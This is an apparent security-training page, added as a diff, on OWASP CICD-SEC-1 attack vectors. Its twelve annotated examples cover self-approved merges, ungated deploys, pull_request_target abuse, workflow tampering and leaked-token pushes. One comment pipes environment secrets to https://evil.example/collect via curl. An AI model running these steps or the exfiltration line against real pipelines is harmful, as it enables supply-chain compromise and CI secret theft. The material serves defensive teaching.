@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CICD-SEC-1: Insufficient Flow Control Mechanisms - Attack Vectors</title>
+    <link rel="stylesheet" href="/platform/frontend/js/dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .doc-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .back-nav {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 20px;
+            margin-bottom: 30px;
+            color: var(--primary-color);
+            text-decoration: none;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+
+        .back-nav:hover {
+            background-color: rgba(245, 158, 11, 0.1);
+            border-color: var(--primary-color);
+            box-shadow: none;
+        }
+
+        .content {
+            background: var(--card-bg);
+            border-radius: 8px;
+            padding: 40px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 10px rgba(245, 158, 11, 0.1);
+        }
+
+        .content h1 {
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--primary-color);
+            text-shadow: none;
+        }
+
+        .content h2 {
+            color: var(--secondary-color);
+            font-size: 1.8rem;
+            margin-top: 40px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .content h3 {
+            color: var(--primary-color);
+            font-size: 1.4rem;
+            margin-top: 30px;
+            margin-bottom: 12px;
+        }
+
+        .content h4 {
+            color: var(--secondary-color);
+            font-size: 1.2rem;
+            margin-top: 25px;
+            margin-bottom: 10px;
+        }
+
+        .content p {
+            color: var(--text-color);
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+
+        .content ul, .content ol {
+            margin-left: 25px;
+            margin-bottom: 15px;
+            color: var(--text-color);
+        }
+
+        .content li {
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .content code {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 2px 8px;
+            border-radius: 4px;
+            color: var(--primary-color);
+            font-family: 'Courier New', monospace;
+            border: 1px solid var(--border-color);
+        }
+
+        .content pre {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 20px 0;
+            border: 1px solid var(--primary-color);
+            box-shadow: none;
+        }
+
+        .content pre code {
+            background: none;
+            padding: 0;
+            border: none;
+            color: var(--primary-color);
+        }
+
+        .content blockquote {
+            border-left: 4px solid var(--primary-color);
+            padding-left: 20px;
+            margin: 20px 0;
+            background: rgba(245, 158, 11, 0.05);
+            padding: 15px 20px;
+            border-radius: 4px;
+        }
+
+        .content table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            border: 1px solid var(--border-color);
+        }
+
+        .content table th {
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.2), rgba(251, 191, 36, 0.2));
+            color: var(--primary-color);
+            padding: 12px;
+            text-align: left;
+            border: 1px solid var(--border-color);
+        }
+
+        .content table td {
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+        }
+
+        .content table tr:hover {
+            background: rgba(245, 158, 11, 0.05);
+        }
+
+        .content a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .content a:hover {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+
+        .content strong {
+            color: var(--secondary-color);
+            font-weight: 600;
+        }
+
+        .toc {
+            background: rgba(245, 158, 11, 0.05);
+            border: 1px solid var(--primary-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .toc h2 {
+            color: var(--primary-color);
+            margin-top: 0;
+            border-bottom: 2px solid var(--primary-color);
+            padding-bottom: 10px;
+        }
+
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+
+        .toc li {
+            margin-bottom: 8px;
+        }
+
+        .toc a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .toc a:hover {
+            color: var(--primary-color);
+        }
+
+        .toc a:before {
+            content: "▸";
+            color: var(--primary-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="doc-container">
+        <a href="/learn/cicd" class="back-nav">
+            <i class="fas fa-arrow-left"></i> Back
+        </a>
+
+        <div class="content">
+            <h1>CICD-SEC-1: Insufficient Flow Control Mechanisms - Attack Vectors</h1>
+
+<div class="toc">
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#understanding">Understanding Flow-Control Attack Vectors</a></li>
+<li><a href="#core-attack-flow">Core Attack Flow</a></li>
+<li><a href="#patterns">Common Attack Patterns</a></li>
+<li><a href="#chaining">Chaining an Uncontrolled Flow</a></li>
+</ul>
+</div>
+
+<h2 id="understanding">Understanding Flow-Control Attack Vectors</h2>
+
+<blockquote>
+<p><strong>&#9888; EDUCATIONAL PURPOSE ONLY</strong> &mdash; the techniques below are shown so you can find and close these gaps in pipelines you own or are authorised to test.</p>
+</blockquote>
+
+<p>An attacker exploiting CICD-SEC-1 does not need a memory-corruption bug or a clever payload. They need <strong>one foothold</strong>&mdash;a developer account, a leaked token, an accepted pull request, or the ability to open a pull request&mdash;and a flow with no gate that would stop that foothold from reaching production. The exploitation is procedural: follow the path a legitimate change would follow, and observe that nothing along it demands a second, independent decision.</p>
+
+<p>The attacker's objective in this category is almost always the same: <strong>get attacker-chosen code, configuration, or artifacts into a trusted output</strong> (the mainline branch, a release, a container image, or a live environment) while passing through the fewest possible checks&mdash;ideally zero.</p>
+
+<h3 id="core-attack-flow">Core Attack Flow</h3>
+
+<pre><code>1. Gain a foothold
+   &darr;
+   Compromised dev account, leaked PAT/deploy token, or fork PR access
+2. Locate the weakest transition
+   &darr;
+   Which step (push, merge, deploy) has no enforced gate?
+3. Advance the change
+   &darr;
+   Direct push / self-approve / merge with failing checks / trigger deploy
+4. Reach the trusted output
+   &darr;
+   Malicious code in main, in a signed release, or running in production</code></pre>
+
+<h2 id="patterns">Common Attack Patterns</h2>
+
+<h3>1. Direct Push to an Unprotected Mainline</h3>
+
+<p>The simplest vector: the branch that feeds production has no protection rule, so a foothold writes to it directly.</p>
+
+<pre><code># No branch protection on main -> the pull-request flow is optional:
+git clone https://token@git.example.com/org/service.git
+cd service
+echo 'exfil_secrets()' &gt;&gt; app/startup.py
+git commit -am "chore: tidy startup"
+git push origin main        # accepted; no review, no check, now in the release line</code></pre>
+
+<p><strong>Payoff</strong>: attacker code enters the trusted branch with no reviewer ever seeing it. Everything that builds from <code>main</code> now carries the payload.</p>
+
+<h3>2. Self-Approving Your Own Pull Request</h3>
+
+<p>Where a review is "required" but nobody restricts <em>who</em> may approve, the author approves their own change.</p>
+
+<pre><code># The rule: "require 1 approving review". The gap: the author can be the approver.
+gh pr create --base main --head feature/x --title "perf tweak"
+gh pr review --approve         # the author approves their own PR
+gh pr merge --merge            # requirement satisfied by the author alone</code></pre>
+
+<p><strong>Payoff</strong>: the appearance of review with none of the substance&mdash;one actor supplies both the change and the only approval.</p>
+
+<h3>3. Merging With Failing or Absent Status Checks</h3>
+
+<p>Checks exist in the pipeline but are not marked <em>required</em>, so the merge proceeds regardless of their result.</p>
+
+<pre><code># The scan job fails (it found the payload), but it is not a required check:
+#   build   x failing
+#   tests   x failing
+#   scan    x failing
+# Merge button stays enabled because none are "required for merge".
+gh pr merge --merge     # ships despite every check being red</code></pre>
+
+<p><strong>Payoff</strong>: security and quality gates that never actually block anything&mdash;the attacker ignores them.</p>
+
+<h3>4. Abusing Auto-Merge</h3>
+
+<p>Auto-merge configured without a meaningful gate merges a pull request as soon as trivial conditions are met.</p>
+
+<pre><code># A bot or label triggers auto-merge before any human looks at the diff:
+gh pr create --base main --head feature/x --title "deps: bump"
+gh pr merge --auto --merge     # queued to merge the instant checks (if any) pass
+# If checks are absent or non-blocking, this is effectively "merge on open".</code></pre>
+
+<p><strong>Payoff</strong>: the change is merged automatically, giving a reviewer no window to intervene.</p>
+
+<h3>5. Deploying Straight to Production With No Approval</h3>
+
+<p>A deploy workflow fires on every push to <code>main</code>, or a manual deploy anyone can trigger, with no environment approval between merge and release.</p>
+
+<pre><code>on:
+  push:
+    branches: [ main ]
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: ./deploy.sh production      # no environment gate, no 2nd approver</code></pre>
+
+<p><strong>Payoff</strong>: reaching <code>main</code> and reaching production are the same event&mdash;merge (however achieved) equals release.</p>
+
+<h3>6. Poisoned Pipeline Execution via Fork Pull Requests</h3>
+
+<p>A workflow runs untrusted fork code in a privileged context, so merely opening a pull request executes attacker code with the repository's secrets.</p>
+
+<pre><code>on: pull_request_target        # runs with BASE repo secrets
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}   # attacker's fork code
+      - run: npm ci &amp;&amp; npm test    # attacker-controlled scripts run WITH secrets
+        # e.g. a malicious "test" script in package.json exfiltrates:
+        #   env | curl -X POST --data-binary @- https://evil.example/collect</code></pre>
+
+<p><strong>Payoff</strong>: no merge, no review, not even an account&mdash;opening a pull request is enough to run code in a trusted context and steal CI secrets or deploy tokens.</p>
+
+<h3>7. Tampering With the Pipeline Definition Itself</h3>
+
+<p>Because the gates are code, the attacker edits the workflow to remove them&mdash;in the same change that carries the payload.</p>
+
+<pre><code>--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+-      - name: Security scan (required)
+-        run: ./security-scan.sh
++      # scan step deleted
+-    if: github.actor != 'dependabot[bot]'
++    if: false                 # disable the job entirely</code></pre>
+
+<p><strong>Payoff</strong>: if workflow files are not separately owned and reviewed, the attacker deletes the very checks that would have caught them&mdash;the flow polices itself out of existence.</p>
+
+<h3>8. Pushing With a Broad Token or Bot Identity</h3>
+
+<p>A leaked personal access token, CI token, or over-privileged bot writes to protected branches because protection does not apply to it.</p>
+
+<pre><code># A CI token with write scope, or a bot excluded from branch protection:
+curl -X PUT \
+  -H "Authorization: Bearer $LEAKED_PAT" \
+  https://api.example.com/repos/org/service/contents/app/config.py \
+  -d '{"message":"update","branch":"main","content":"&lt;base64 payload&gt;"}'</code></pre>
+
+<p><strong>Payoff</strong>: automation identities frequently sit <em>outside</em> the review rules, so a stolen token bypasses gates that would stop a human.</p>
+
+<h3>9. Exploiting Admin / Force-Push Bypass</h3>
+
+<p>Protection rules that do not "include administrators" let a privileged account (or an attacker who reached one) skip the flow entirely.</p>
+
+<pre><code># Protection enabled, but "include administrators" is OFF:
+git push --force origin main          # admin rewrites protected history
+# or the admin merges without the required review, because the rule
+# simply does not apply to them.</code></pre>
+
+<p><strong>Payoff</strong>: the highest-value accounts are also the ones the gates ignore, so compromising one is a clean bypass.</p>
+
+<h3>10. Promoting an Unvetted Artifact to Production</h3>
+
+<p>A manual promotion job pushes any artifact to the production registry with no gate verifying how it was built.</p>
+
+<pre><code># Anyone who can run the job can promote an arbitrary image tag to prod:
+on: workflow_dispatch
+  inputs:
+    image_tag: { required: true }
+jobs:
+  promote:
+    steps:
+      - run: |
+          docker pull registry.example.com/app:${{ inputs.image_tag }}
+          docker tag  registry.example.com/app:${{ inputs.image_tag }} registry.example.com/app:prod
+          docker push registry.example.com/app:prod     # no provenance check, no approval</code></pre>
+
+<p><strong>Payoff</strong>: the attacker substitutes a tampered artifact at the promotion step, downstream of&mdash;and unprotected by&mdash;any source-side review.</p>
+
+<h3>11. Bypassing Environment Approval With a Second Workflow</h3>
+
+<p>The production environment requires approval, but a different, unprotected workflow can reach the same environment or credentials.</p>
+
+<pre><code># deploy.yml uses environment: production (protected, needs approval).
+# But utility.yml uses the same secrets with NO environment gate:
+jobs:
+  maintenance:
+    runs-on: ubuntu-latest
+    # no `environment:` key -> approval rule never applies
+    steps:
+      - run: ./deploy.sh production
+        env:
+          PROD_TOKEN: ${{ secrets.PROD_DEPLOY_TOKEN }}   # same power, no gate</code></pre>
+
+<p><strong>Payoff</strong>: the gate protects one door while an equivalent door stands open&mdash;flow control that is not applied uniformly is not applied at all.</p>
+
+<h3>12. Merge-Then-Revert Timing (Beating a Slow Review)</h3>
+
+<p>Where merge does not truly block on review, an attacker merges during a low-attention window, triggering an immediate deploy before anyone reverts.</p>
+
+<pre><code># If deploy fires on push to main and review is advisory rather than blocking:
+#   t+0s   attacker merges (self-approved) at an off-hour
+#   t+3s   deploy-to-prod workflow runs and ships the payload
+#   t+20m  a human notices and reverts -> too late, prod already ran it</code></pre>
+
+<p><strong>Payoff</strong>: an ungated deploy turns even a briefly-present change into a production event; reverting the source does not un-deploy what already shipped.</p>
+
+<h2 id="chaining">Chaining an Uncontrolled Flow</h2>
+
+<p>The individual gaps compound into a clean path from foothold to production:</p>
+
+<pre><code>Leaked CI token (broad write scope)     -&gt; push directly to main
+        +
+main has no required review              -&gt; no human sees the change
+        +
+deploy fires on push to main             -&gt; change is live in seconds
+        =  attacker code in production, no review, no approval, no gate</code></pre>
+
+<p>Another common chain removes the controls first:</p>
+
+<pre><code>Self-approve a small PR that edits .github/workflows/*
+        -&gt; delete the required security-scan step (workflow not code-owned)
+        -&gt; open a second PR with the real payload
+        -&gt; the scan that would have caught it no longer runs
+        =  payload merges and deploys through a pipeline the attacker disarmed</code></pre>
+
+<h2>Key Takeaways</h2>
+
+<ol>
+<li><strong>Exploitation is procedural, not technical</strong>&mdash;the attacker walks the normal delivery path and finds no gate that stops one actor.</li>
+<li><strong>Automation identities are the soft underbelly</strong>&mdash;tokens and bots often sit outside the very rules that constrain humans.</li>
+<li><strong>Fork pull requests can be code execution</strong>&mdash;running untrusted PR code in a privileged context needs no merge and no account.</li>
+<li><strong>The gates are code, so they can be deleted</strong>&mdash;an uncontrolled flow is routinely used to remove flow control.</li>
+<li><strong>A gate that is not uniform is not a gate</strong>&mdash;one unprotected workflow, branch, or token undoes every protected one.</li>
+</ol>
+
+<h2>Next Steps</h2>
+
+<ul>
+<li><strong><a href="prevention.html">Prevention Guide</a></strong>: Build layered, enforced gates across the whole flow</li>
+<li><strong><a href="examples.html">Code Examples</a></strong>: Insecure vs. secure pipeline configuration in GitHub Actions, GitLab CI, and Jenkins</li>
+<li><strong><a href="/learn/cicd">CI/CD Security Track</a></strong>: Continue with the rest of the OWASP CI/CD Top 10</li>
+<li><strong><a href="/practice">Practice</a></strong>: Apply what you have learned in hands-on exercises</li>
+</ul>
+
+        </div>
+    </div>
+</body>
+</html>
